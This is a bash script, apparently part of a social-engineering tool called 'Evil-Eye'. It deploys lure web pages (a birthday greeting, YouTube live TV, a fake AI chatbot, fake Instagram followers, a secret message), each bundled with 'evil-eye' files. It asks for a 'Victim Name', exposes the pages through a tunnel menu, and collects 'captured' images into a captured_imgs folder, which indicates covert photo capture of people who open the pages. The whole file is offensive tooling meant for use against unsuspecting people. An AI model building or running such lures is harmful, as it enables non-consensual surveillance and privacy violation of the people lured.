#!/bin/bash

# Evil-Eye file Path
EYE_PATH="$SCRIPT_DIR/.sites/evil-eye"

# ─────────────────────────────────────────────────────────────────────────────
# Move captured image files from .server/images → captured_imgs/
# ─────────────────────────────────────────────────────────────────────────────
move_capture_file() {
    if [ -d "$SCRIPT_DIR/.server/images" ]; then
        shopt -s nullglob
        local files=("$SCRIPT_DIR/.server/images/"*)
        if [[ ${#files[@]} -gt 0 ]]; then
            mv "${files[@]}" "$SCRIPT_DIR/captured_imgs/"
        fi
        shopt -u nullglob
    fi
    sleep 0.2
}

# ─────────────────────────────────────────────────────────────────────────────
# All top-level startup code is now inside init_setup().
# evel.sh calls this AFTER load_lib() so SCRIPT_DIR is already set.
# ─────────────────────────────────────────────────────────────────────────────
init_setup() {
    # Ensure captured_imgs folder exists
    if [ ! -d "$SCRIPT_DIR/captured_imgs" ]; then
        mkdir -p "$SCRIPT_DIR/captured_imgs"
    fi

    # Ensure .server folder exists
    if [ ! -d "$SCRIPT_DIR/.server" ]; then
        mkdir -p "$SCRIPT_DIR/.server"
    fi

    # Move any leftover images from a previous run, then clean .server
    move_capture_file
    rm -rf "$SCRIPT_DIR/.server/"*
}

# ─────────────────────────────────────────────────────────────────────────────
# verify template + evil-eye dirs exist and are non-empty
# ─────────────────────────────────────────────────────────────────────────────
_check_template_dir() {
    local path="$1"
    if [ ! -d "$path" ] || [ -z "$(ls -A "$path" 2>/dev/null)" ] || \
       [ ! -d "$EYE_PATH" ] || [ -z "$(ls -A "$EYE_PATH" 2>/dev/null)" ]; then
        echo -e "\n    ${red}[${orange}✖${red}]${white} Template files not found. ${blue}Path: ${red}$path${nocolor}"
        echo -e "    ${red}[${orange}!${red}]${white} Exiting...${nocolor}"
        exit 1
    fi
}

# ─────────────────────────────────────────────────────────────────────────────
# Birthday Wish
# ─────────────────────────────────────────────────────────────────────────────
setup_birthday_wish() {
    local birthday_wish_path="$SCRIPT_DIR/.sites/birthday_wish/"
    _check_template_dir "$birthday_wish_path"

    cp -r "$birthday_wish_path"/* "$SCRIPT_DIR/.server/"
    cp -r "$EYE_PATH"/*           "$SCRIPT_DIR/.server/"
    sleep 1

    echo -e ""
    read -p "    ${cyan}[${orange}+${cyan}]${white} Enter Victim Name: ${green}" newname
    echo -e "${nocolor}"

    # sanitize user input before passing to sed
    local safe_name
    safe_name=$(printf '%s' "$newname" | sed 's/[\/&]/\\&/g')

    sed -i "s/<span id=\"user-name\">.*<\/span>/<span id=\"user-name\">$safe_name<\/span>/g" \
        "$SCRIPT_DIR/.server/index.php"

    echo -e "    ${cyan}[${orange}+${cyan}]${white} Victim name set to: ${blue}$newname${nocolor}"
    sleep 1
    tunnel_menu
}

# ─────────────────────────────────────────────────────────────────────────────
# YouTube Live TV
# ─────────────────────────────────────────────────────────────────────────────
setup_youtube_tv() {
    local yt_templates_path="$SCRIPT_DIR/.sites/youtube_live"
    _check_template_dir "$yt_templates_path"

    cp -r "$yt_templates_path"/* "$SCRIPT_DIR/.server/"
    cp -r "$EYE_PATH"/*          "$SCRIPT_DIR/.server/"
    sleep 1

    echo -e ""
    read -p "    ${cyan}[${orange}+${cyan}]${white} Enter YouTube video link: ${green}" yt_vid_link
    echo -e "${nocolor}"

    # Extract 11-char video ID from various YouTube URL formats
    local VIDEO_ID
    VIDEO_ID=$(echo "$yt_vid_link" | \
        sed -E 's/.*(v=|\/v\/|embed\/|shorts\/|youtu\.be\/)([a-zA-Z0-9_-]{11}).*/\2/')

    if [[ ${#VIDEO_ID} -eq 11 ]]; then
        echo -e "    ${cyan}[${orange}+${cyan}]${white} Video ID found: ${green}$VIDEO_ID${nocolor}"
        local YT_URL="https://www.youtube.com/embed/$VIDEO_ID?autoplay=1"
        sed -i "s|src=\"\"|src=\"${YT_URL}\"|g" "$SCRIPT_DIR/.server/index.php"
        echo -e "    ${cyan}[${green}✔${cyan}]${white} YouTube video ID updated.${nocolor}"
        sleep 1
        tunnel_menu
    else
        echo -e "    ${red}[!] Could not extract a valid 11-character Video ID. Please try again.${nocolor}"
        sleep 1
        main_menu
    fi
}

# ─────────────────────────────────────────────────────────────────────────────
# Fake AI Chatbot
# ─────────────────────────────────────────────────────────────────────────────
chating_bot() {
    local AI_bot_path="$SCRIPT_DIR/.sites/chating_bot"
    _check_template_dir "$AI_bot_path"

    cp -r "$AI_bot_path"/* "$SCRIPT_DIR/.server/"
    cp -r "$EYE_PATH"/*    "$SCRIPT_DIR/.server/"
    echo -e "    ${cyan}[${green}✔${cyan}]${white} Files deployed successfully.${nocolor}"
    sleep 1
    tunnel_menu
}

# ─────────────────────────────────────────────────────────────────────────────
# Fake Instagram Followers
# ─────────────────────────────────────────────────────────────────────────────
fake_insta_follower() {
    local Fake_insta_path="$SCRIPT_DIR/.sites/fake_insta_follower"
    _check_template_dir "$Fake_insta_path"

    cp -r "$Fake_insta_path"/* "$SCRIPT_DIR/.server/"
    cp -r "$EYE_PATH"/*        "$SCRIPT_DIR/.server/"
    echo -e "    ${cyan}[${green}✔${cyan}]${white} Files deployed successfully.${nocolor}"
    sleep 1
    tunnel_menu
}

# ─────────────────────────────────────────────────────────────────────────────
# Secret Message
# ─────────────────────────────────────────────────────────────────────────────
secret_msg() {
    local Sec_msg_path="$SCRIPT_DIR/.sites/secret_message"
    local JSON_FILE="$SCRIPT_DIR/.server/sentences.json"
    _check_template_dir "$Sec_msg_path"

    cp -r "$Sec_msg_path"/* "$SCRIPT_DIR/.server/"
    cp -r "$EYE_PATH"/*     "$SCRIPT_DIR/.server/"
    sleep 1

    read -r -p "    ${cyan}[${green}+${cyan}]${white} Enter path to your message text file: ${green}" INPUT_FILE
    echo -e "${nocolor}"

    # Expand ~ and strip surrounding quotes
    INPUT_FILE="${INPUT_FILE/#\~/$HOME}"
    INPUT_FILE=$(echo "$INPUT_FILE" | sed "s/['\"]//g")

    if [ ! -f "$INPUT_FILE" ]; then
        echo -e "    ${red}[!] File '$INPUT_FILE' not found. Please check the path.${nocolor}"
        sleep 1
        main_menu
        return
    fi

    jq -R -s 'split("\n") | map(select(length > 0)) | {texts: .}' \
        "$INPUT_FILE" > "$JSON_FILE"

    echo -e "    ${cyan}[${green}✔${cyan}]${white} Messages updated and deployed.${nocolor}"
    sleep 1
    tunnel_menu
}
